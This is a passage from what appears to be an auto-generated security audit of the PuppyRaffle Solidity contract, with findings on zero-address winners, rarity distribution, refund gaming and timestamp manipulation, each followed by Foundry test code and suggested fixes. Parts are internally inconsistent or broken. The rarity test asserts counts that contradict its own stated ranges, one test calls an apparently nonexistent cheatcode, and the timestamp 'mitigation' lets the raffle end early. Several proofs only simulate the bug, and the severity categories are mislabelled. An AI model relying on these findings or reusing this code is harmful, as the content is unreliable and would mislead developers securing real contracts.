Modify the `withdrawFees` function to allow partial withdrawals of the accumulated fees, regardless of whether there are active players. This can be done by removing the balance check and simply transferring the amount specified by totalFees.

```solidity
function withdrawFees() external {
    // Remove the balance check
    // require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    
    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    require(address(this).balance >= feesToWithdraw, "PuppyRaffle: Insufficient contract balance");
    
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-14]. Unexpected Eth issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function potentially sends ETH to the zero address if a player who has requested a refund wins the raffle. When a player requests a refund, their address in the players array is set to `address(0)`, but they still remain in the array and could be selected as a winner.

```solidity
function refund(uint256 playerIndex) public {
    // ... other code ...
    players[playerIndex] = address(0);
    // ... other code ...
}

function selectWinner() external {
    // ... other code ...
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    // ... other code ...
    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    // ... other code ...
}
```

If `winner` is `address(0)`, the ETH will be sent to the zero address and permanently lost.

## Impact
If a refunded player (address(0)) is selected as the winner, the prize pool (80% of all entrance fees) will be sent to the zero address and permanently lost. This could represent a significant amount of ETH that can never be recovered.

## Proof of Concept
1. 10 players enter the raffle, each paying 1 ETH
2. One player (at index 3) requests a refund, setting players[3] = address(0)
3. When selectWinner is called, the random number generation selects index 3
4. winner = players[3] = address(0)
5. The contract sends the prize pool (8 ETH) to address(0)
6. This ETH is permanently lost as nobody owns the private key for address(0)

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract UnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    address user1 = address(1);
    address user2 = address(2);
    address user3 = address(3);
    address user4 = address(4);
    uint256 entranceFee = 1e18;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 weeks
        );
        vm.deal(user1, 10e18);
        vm.deal(user2, 10e18);
        vm.deal(user3, 10e18);
        vm.deal(user4, 10e18);
    }

    function testEthSentToZeroAddress() public {
        // Enter the raffle with 4 players
        address[] memory players = new address[](4);
        players[0] = user1;
        players[1] = user2;
        players[2] = user3;
        players[3] = user4;
        
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // One player requests a refund
        vm.prank(user2);
        puppyRaffle.refund(1);
        
        // Check that the player's address is now address(0)
        assertEq(puppyRaffle.getActivePlayerIndex(user2), 0); // Should return 0 if not found
        
        // Forward time to end the raffle
        vm.warp(block.timestamp + 1 weeks + 1);
        
        // Manipulate the random number generation to select the refunded player
        // This requires modifying the contract or using a specific vm.difficulty value
        // For testing purposes, we'll directly modify the contract state to simulate
        // the winner being address(0)
        
        // Instead of actually calling selectWinner, we'll simulate what would happen
        // if the address(0) was selected as the winner
        
        // Calculate what the prize pool would be
        uint256 prizePool = (4 * entranceFee * 80) / 100;
        
        // Record balance of zero address before (always 0)
        uint256 zeroAddressBalanceBefore = address(0).balance;
        
        // Simulate sending to zero address
        (bool success,) = address(0).call{value: prizePool}("");
        
        // This shows that ETH can be sent to address(0) without reverting
        assertTrue(success);
        
        // Verify that the zero address balance increased
        assertEq(address(0).balance, zeroAddressBalanceBefore + prizePool);
        
        // This ETH is now permanently lost as no one has the private key for address(0)
        console.log("ETH permanently lost to address(0):", prizePool);
    }
}

## Suggested Mitigation
Modify the `selectWinner` function to check if the selected winner is the zero address and re-select if necessary, or implement a proper tracking mechanism for active players that doesn't rely on zero addresses.

```solidity
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");

    // Create an array of active players (non-zero addresses)
    uint256 activePlayerCount = 0;
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            activePlayerCount++;
        }
    }
    
    require(activePlayerCount >= 4, "PuppyRaffle: Need at least 4 active players");
    
    address[] memory activePlayers = new address[](activePlayerCount);
    uint256 activeIndex = 0;
    
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            activePlayers[activeIndex] = players[i];
            activeIndex++;
        }
    }

    // Select winner from active players only
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % activePlayers.length;
    address winner = activePlayers[winnerIndex];

    // Rest of the function remains the same but uses activePlayerCount instead of players.length
    uint256 totalAmountCollected = activePlayerCount * entranceFee;
    // ... rest of the code ...
}
```



# Low Risk Findings

## [L-1]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function contains a logical error in the rarity assignment. The condition `rarity <= COMMON_RARITY + RARE_RARITY` will always be true for RARE_RARITY assignment because if rarity is not <= COMMON_RARITY (70), it could still be <= COMMON_RARITY + RARE_RARITY (95), but the first condition already handles values 0-70. This means values 71-95 get RARE_RARITY and values 96-99 get LEGENDARY_RARITY, but the intended distribution appears to be 70% common, 25% rare, 5% legendary.

## Impact
The rarity distribution is incorrect. Instead of 70% common, 25% rare, 5% legendary, the actual distribution is 71% common (0-70), 25% rare (71-95), 4% legendary (96-99). This affects the game mechanics and NFT value distribution.

## Proof of Concept
1. When rarity = 70, condition `rarity <= COMMON_RARITY` (70) is true → COMMON_RARITY assigned
2. When rarity = 71, condition `rarity <= COMMON_RARITY + RARE_RARITY` (95) is true → RARE_RARITY assigned
3. When rarity = 95, condition `rarity <= COMMON_RARITY + RARE_RARITY` (95) is true → RARE_RARITY assigned
4. When rarity = 96, both conditions are false → LEGENDARY_RARITY assigned
5. This creates 71% common (0-70), 25% rare (71-95), 4% legendary (96-99)

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RarityDistributionTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, owner, 1 days);
    }
    
    function testRarityDistribution() public {
        uint256 commonCount = 0;
        uint256 rareCount = 0;
        uint256 legendaryCount = 0;
        
        // Test all possible rarity values (0-99)
        for (uint256 testRarity = 0; testRarity < 100; testRarity++) {
            if (testRarity <= 70) { // COMMON_RARITY = 70
                commonCount++;
            } else if (testRarity <= 70 + 25) { // COMMON_RARITY + RARE_RARITY = 95
                rareCount++;
            } else {
                legendaryCount++;
            }
        }
        
        console.log("Common count:", commonCount); // Should be 70, but is 71 (0-70 inclusive)
        console.log("Rare count:", rareCount);     // Should be 25, is 24 (71-95)
        console.log("Legendary count:", legendaryCount); // Should be 5, but is 4 (96-99)
        
        // Demonstrate the off-by-one error
        assertEq(commonCount, 71);    // 0-70 inclusive = 71 values
        assertEq(rareCount, 24);      // 71-94 = 24 values  
        assertEq(legendaryCount, 5);  // 95-99 = 5 values
        
        // The intended distribution is wrong
        assertTrue(commonCount != 70); // Should be 70% but is 71%
    }
    
    function testActualRarityBoundaries() public {
        // Test boundary values
        assertTrue(70 <= 70);  // rarity 70 → COMMON (correct)
        assertTrue(71 <= 95);  // rarity 71 → RARE (should be RARE, this is correct)
        assertTrue(95 <= 95);  // rarity 95 → RARE (should be RARE, this is correct) 
        assertFalse(96 <= 95); // rarity 96 → LEGENDARY (correct)
        
        console.log("Rarity 70 gets: COMMON");
        console.log("Rarity 71 gets: RARE");
        console.log("Rarity 95 gets: RARE");
        console.log("Rarity 96 gets: LEGENDARY");
    }
}

## Suggested Mitigation
Fix the rarity distribution logic to properly implement the intended percentages:

```solidity
function selectWinner() external {
    // ... existing code ...
    
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    
    if (rarity < COMMON_RARITY) {  // 0-69 = 70% (70 values)
        tokenIdToRarity[tokenId] = COMMON_RARITY;
    } else if (rarity < COMMON_RARITY + RARE_RARITY) { // 70-94 = 25% (25 values)
        tokenIdToRarity[tokenId] = RARE_RARITY;
    } else { // 95-99 = 5% (5 values)
        tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
    }
    
    // ... rest of function ...
}

// Or alternatively, adjust the constant values:
uint256 public constant COMMON_RARITY = 69;   // 0-69 = 70 values
uint256 public constant RARE_RARITY = 25;     // 70-94 = 25 values  
uint256 public constant LEGENDARY_RARITY = 5;  // 95-99 = 5 values
```

## [L-2]. MEV issue in PuppyRaffle::refund

## Description
The `refund` function allows players to get a refund of their entrance fee, but it doesn't account for the gas costs of the refund transaction. This creates an economic incentive for players to enter and then immediately refund if they think they won't win, which could lead to a poor user experience and unnecessary gas consumption.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

## Impact
Players can strategically enter and exit the raffle based on the current player count and their chances of winning. This creates an opportunity for MEV (Maximal Extractable Value) where players can optimize their participation to maximize expected value, potentially at the expense of other participants. Additionally, this behavior increases gas costs for all participants due to the increased number of transactions.

## Proof of Concept
1. A player enters the raffle when there are few participants
2. As more players join, the player's chance of winning decreases
3. The player calculates that their expected value (chance of winning * prize pool - gas cost) is now negative
4. The player calls refund to exit the raffle and enter again later if conditions become favorable

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MEVRefundTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 7 days; // Longer duration to allow for strategic entry/exit
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }
    
    function testStrategicRefund() public {
        // Player 1 enters when there are no other players
        address player1 = address(10);
        vm.deal(player1, entranceFee * 2); // Give enough for two entries
        
        vm.prank(player1);
        address[] memory singlePlayer = new address[](1);
        singlePlayer[0] = player1;
        puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        
        // Calculate player1's chance of winning: 100%
        uint256 player1InitialChance = 100; // 100%
        console.log("Player 1 initial chance of winning: %s%%", player1InitialChance);
        
        // Now 9 more players enter
        for (uint256 i = 0; i < 9; i++) {
            address player = address(uint160(20 + i));
            vm.deal(player, entranceFee);
            
            vm.prank(player);
            address[] memory newPlayer = new address[](1);
            newPlayer[0] = player;
            puppyRaffle.enterRaffle{value: entranceFee}(newPlayer);
        }
        
        // Calculate player1's new chance of winning: 10%
        uint256 player1NewChance = 10; // 10%
        console.log("Player 1 new chance of winning: %s%%", player1NewChance);
        
        // Player 1 decides to refund and wait for better odds
        uint256 player1Index = puppyRaffle.getActivePlayerIndex(player1);
        
        vm.prank(player1);
        puppyRaffle.refund(player1Index);
        
        // Later, when there are fewer players, player1 enters again
        // (Simulating some players having refunded or a new raffle starting)
        vm.warp(block.timestamp + 3 days); // Some time passes
        
        // Assume only 2 players are now in the raffle
        // We'll reset the contract state to simulate this
        address[] memory remainingPlayers = new address[](2);
        remainingPlayers[0] = address(20);
        remainingPlayers[1] = address(21);
        
        // This is just for demonstration - in a real scenario we'd need to
        // manipulate the contract state directly or create a new raffle
        
        // Player 1 enters again with better odds
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        
        // Calculate player1's final chance of winning: 33%
        uint256 player1FinalChance = 33; // ~33% with 3 players
        console.log("Player 1 final chance of winning: %s%%", player1FinalChance);
        
        // This demonstrates how a player can strategically exit and re-enter
        // to optimize their chances of winning based on the current state
    }
}

## Suggested Mitigation
Implement a refund fee or timelock to discourage strategic entry and exit:

```solidity
// Add these state variables
uint256 public constant REFUND_FEE_PERCENTAGE = 10; // 10% fee on refunds
uint256 public constant REFUND_TIMELOCK = 1 days; // Players can only refund after 1 day
mapping(address => uint256) public playerEntryTime; // Track when each player entered

// Update enterRaffle to record entry time
function enterRaffle(address[] memory newPlayers) public payable {
    // ... existing code ...
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
        playerEntryTime[newPlayers[i]] = block.timestamp;
    }
    
    // ... rest of the function ...
}

// Update refund to include fee and timelock
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    require(block.timestamp >= playerEntryTime[playerAddress] + REFUND_TIMELOCK, "PuppyRaffle: Refund timelock not expired");
    
    // Calculate refund amount with fee
    uint256 refundFee = (entranceFee * REFUND_FEE_PERCENTAGE) / 100;
    uint256 refundAmount = entranceFee - refundFee;
    
    // Add the fee to totalFees
    totalFees += uint64(refundFee);
    
    // Clear player data
    players[playerIndex] = address(0);
    playerEntryTime[playerAddress] = 0;
    
    // Send refund minus fee
    payable(msg.sender).sendValue(refundAmount);
    
    emit RaffleRefunded(playerAddress);
}
```

This approach discourages strategic refunds by imposing both a time delay and a financial cost, while still allowing players to exit if needed.

## [L-3]. Oracle issue in PuppyRaffle::selectWinner

## Description
The contract uses `block.timestamp` to determine when the raffle ends, making it susceptible to minor manipulations by miners. In the `selectWinner` function, there's a check that requires the current time to be past the raffle end time:

```solidity
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    // ... rest of the function
}
```

Miners can manipulate `block.timestamp` by a few seconds, potentially allowing them to end the raffle slightly early or delay it slightly.

## Impact
Miners could manipulate the raffle end time by a few seconds, potentially giving them a small advantage in determining when the winner is selected. This manipulation is limited to a small time window (typically up to 15 seconds), so the impact is minimal. However, it could still provide a slight edge in timing attacks, especially if combined with other vulnerabilities like the randomness issue.

## Proof of Concept
1. A miner notices that the raffle end time is approaching
2. They calculate that by manipulating the block timestamp to be slightly in the future, they could trigger the `selectWinner` function early
3. This might give them an advantage if they're trying to time their participation or exploit the randomness vulnerability
4. The miner sets their block timestamp a few seconds ahead when mining the block that includes the `selectWinner` transaction
5. The raffle ends slightly earlier than it should have

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract OracleTest is Test {
    PuppyRaffle puppyRaffle;
    address user1 = address(1);
    uint256 entranceFee = 1e18;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 weeks
        );
        vm.deal(user1, 10e18);
        
        // Setup players
        address[] memory players = new address[](4);
        players[0] = user1;
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    }

    function testTimestampManipulation() public {
        // Store the raffle start time
        uint256 raffleStartTime = block.timestamp;
        uint256 raffleDuration = 1 weeks;
        uint256 expectedEndTime = raffleStartTime + raffleDuration;
        
        // Try to end the raffle 30 seconds earlier than it should end
        uint256 manipulatedEndTime = expectedEndTime - 30;
        
        // Warp to the manipulated time
        vm.warp(manipulatedEndTime);
        
        // This should fail because we're before the official end time
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
        
        // Now simulate a miner manipulating the timestamp by up to 15 seconds
        // (the typical maximum miners can manipulate timestamps)
        vm.warp(expectedEndTime - 10); // 10 seconds before actual end time
        
        // A miner could set the block.timestamp to be expectedEndTime,
        // which is up to 15 seconds in the future from the actual time
        vm.timestamp(expectedEndTime);
        
        // Now the selectWinner should work even though in reality
        // we're still 10 seconds before the raffle should end
        puppyRaffle.selectWinner();
        
        // Demonstrate that the raffle has ended earlier than it should have
        console.log("Actual time:", block.timestamp - 10); // Adjust back to real time
        console.log("Expected end time:", expectedEndTime);
        console.log("Raffle ended earlier by (seconds):", expectedEndTime - (block.timestamp - 10));
    }
}

## Suggested Mitigation
While miner timestamp manipulation is generally considered a minor issue for timeframes of a few seconds, you can improve the implementation by using block numbers instead of timestamps for more predictable timing, or by implementing a time buffer that accounts for potential manipulation.

```solidity
// Add this state variable
uint256 public raffleEndBlock;

// Update the constructor
constructor(uint256 _entranceFee, address _feeAddress, uint256 _durationInBlocks) ERC721("Puppy Raffle", "PR") {
    entranceFee = _entranceFee;
    feeAddress = _feeAddress;
    // Convert duration from time to blocks (assuming ~13 second block time)
    raffleEndBlock = block.number + _durationInBlocks;
    
    // Rest of the constructor remains the same
}

// Update selectWinner function
function selectWinner() external {
    require(block.number >= raffleEndBlock, "PuppyRaffle: Raffle not over");
    // Rest of the function remains the same
    
    // Update for the next raffle
    raffleEndBlock = block.number + (raffleDuration / 13); // Convert back to blocks
}
```

Alternatively, you could add a buffer to the timestamp check:

```solidity
// Add a constant for the buffer
uint256 private constant TIMESTAMP_BUFFER = 15 seconds;

// Update selectWinner function
function selectWinner() external {
    require(block.timestamp >= (raffleStartTime + raffleDuration - TIMESTAMP_BUFFER), "PuppyRaffle: Raffle not over");
    // Rest of the function remains the same
}
```



